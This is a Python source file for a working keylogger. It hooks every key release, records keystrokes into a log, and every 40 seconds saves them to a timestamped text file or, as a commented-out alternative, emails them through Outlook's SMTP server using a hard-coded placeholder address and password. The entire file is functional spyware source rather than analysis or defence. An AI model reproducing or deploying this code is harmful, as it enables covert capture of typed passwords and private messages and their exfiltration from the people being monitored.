import keyboard #for keylogs
import smtplib # for sending email using SMTP protocol 

# Timer is to make a method runs after an 'interval' amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 40 # (in seconds)
EMAIL_ADDRESS = "email@outlook.com"
EMAIL_PASSWORD = "password"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within 'self.interval'
        self.log = ""
        # record start & end datetimes
        self.start_date = datetime.now()
        self.end_date = datetime.now()

    def key_press(self,event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a keyis released in this example
        """
        name = event.name
        #print(name)
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name=='space':
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                #replace spaces with underscores
                name = name.replace(" ","_")
                name = f"[{name.upper()}]"
            # finally, add the key name to our global 'self.log' variable
        self.log +=name

    def create_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_date_str = str(self.start_date)[:7].replace(" ","_").replace(":","")
        end_date_str = str(self.end_date)[:-7].replace(" ","_").replace(":","")
        self.filename = f'keylog - {start_date_str}_{end_date_str}'

    def save_to_file(self):
        """
        This method creates a log file in the current directory that contains the current keylogs in the 'self.log' variable
        """
        # open the file in write mode(create it)
        with open(f"{self.filename}.txt","w") as f:
            # write the keylogs to the file
            print(self.log, file=f)

        print(f"[+] Saved {self.filename}.txt")

    def prepare_mail(self, message):
        """
        Utility function to construct a MIMEMultipart from a text
        It creates an HTML version as well as text version
        to be sent as an email
        """
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        # Simple paragraph, feel free to edit
        html = f"<p> {message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        # after making the mail, convert back as string message
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        # manages a connection to an SMTP Server
        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
        server = smtplib.SMTP(host="smtp-mail.outlook.com",port=587)
        # connect to the SMTP server as TLS mode (for security)
        server.starttls()
        # login to the mail account
        server.login(email, password)
        # send the actual message after perparation
        server.sendmail(email, email, self.prepare_mail(message))
        # terminates the session
        server.quit()
        if verbose:
            print(f"{datetime.now()}) - Sent an email to {email} containing: {message}")

    def report(self):
        """
        This function gets called every 'self.interval'
        It basically sends keylogs and resets 'self.log' variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_date = datetime.now()
            # update 'self.filename'
            self.create_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.save_to_file()
            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_date = datetime.now()
        self.log = ""
        timer= Timer(interval = self.interval, function=self.report)
        # set the thread as daemon (dies when main thread dies)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start date time
        self.start_date = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.key_press)
        # start reporting the key logs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__=="__main__":
    # if you want keylogger to send to your mail
    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want keylogger to store to the local files
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
